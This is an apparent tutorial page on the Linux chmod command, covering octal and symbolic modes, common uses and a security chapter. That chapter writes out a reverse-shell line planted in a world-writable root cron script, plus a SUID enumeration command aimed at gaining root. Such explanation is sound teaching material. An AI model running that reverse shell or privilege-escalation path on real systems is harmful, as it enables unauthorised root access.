chmod 🔧

Change mode. The command that flips read / write / execute bits
on any file or directory you own.

"chmod +x, now it runs." 🏃
Chapter 01 // Definition

📖 What does chmod do?

Short for "change mode." It's the command you use to modify the permissions (rwx bits) of files and directories.

📝 Think of it like flipping switches on a security panel

Every file has nine switches (3 groups × read/write/execute). chmod is the switch-flipper. You tell it which switches to flip and on which file — it does the thing. You must own the file (or be root).

Two syntaxes. Same result.

🔢 Numeric (absolute)

Set exact permissions with a 3-digit octal number.

chmod 755 script.sh # owner=7 (rwx), group=5 (r-x), other=5 (r-x)

🔤 Symbolic (relative)

Add (+) or remove (-) specific bits.

chmod +x script.sh # add execute chmod u+w file # owner + write chmod go-rwx secret # group+others lose all
💡 Numeric vs symbolic when to use which? Numeric = you're setting everything fresh (deployment scripts, setting a known-good config). Symbolic = you're tweaking ONE bit without touching the others (making something executable, locking down one access level).

Chapter 02 // Symbolic syntax decoded

🔤 The u/g/o/a + rwx grammar

Symbolic chmod reads like: [WHO][OP][WHAT]

WHO

  • u — user (owner)
  • g — group
  • o — others
  • a — all (u+g+o)

OP

  • + — add these permissions
  • - — remove these
  • = — set exactly these (remove others)

WHAT

  • r — read
  • w — write
  • x — execute
  • X — execute only if already executable on some group (for directories)

Examples

chmod u+x file # owner gains execute chmod go-w file # group and others lose write chmod a=r file # everyone: read only chmod u=rwx,go=rx f # owner=rwx, group=r-x, others=r-x (== 755) chmod -R 755 dir/ # recursive — applies to dir AND everything inside

Chapter 03 // The five chmods you'll use 90% of the time

🎯 The greatest hits

📜 chmod +x script.sh

Make a script runnable. You downloaded or wrote a shell script; it won't execute until you flip the x bit. Most common chmod in beginner-land.

🗝️ chmod 600 ~/.ssh/id_rsa

Lock down an SSH private key. SSH itself will REFUSE to use the key if permissions are wider than 600. Forced security.

🏠 chmod 700 ~/.ssh/

Lock down the SSH directory itself. Same deal — SSH refuses if "others" can peek inside.

📁 chmod -R 755 /var/www/html

Standard web root perms. Readable + executable (traverse) by webserver. Writable only by owner.

💥 chmod 777 thing

The "fix my problem, I don't care how" chmod. 99% of the time it's wrong. Attackers love seeing it.

🔒 chmod 400 secret.key

Even stricter — not even the owner can write to it. Prevents accidental overwrites. Common for crypto keys, config.

Chapter 04 // The security angle

🥷 chmod-adjacent attacks

🚨 Classic privesc: A cron job running as root executes a shell script. The script has chmod 777. You edit it to add bash -i >& /dev/tcp/attacker/4444 0>&1. Next cron run: reverse shell as root. 🎣

SUID — the evil cousin

There's a 4th digit you can prepend: chmod 4755 file. The 4 sets the SUID bit. Files with SUID run as their OWNER, not as you.

chmod 4755 /usr/bin/myapp # SUID — runs as root if root owns it chmod 2755 sharedfolder # SGID — files inherit folder's group chmod 1755 /tmp # Sticky bit — only owner can delete their files

Find SUID binaries on any box you land on:

find / -perm -4000 -type f 2>/dev/null

Check each one against GTFOBins — if it's on the list, you probably have a path to root.

You download scanner.sh from GitHub but ./scanner.sh says "Permission denied." What's the fix?
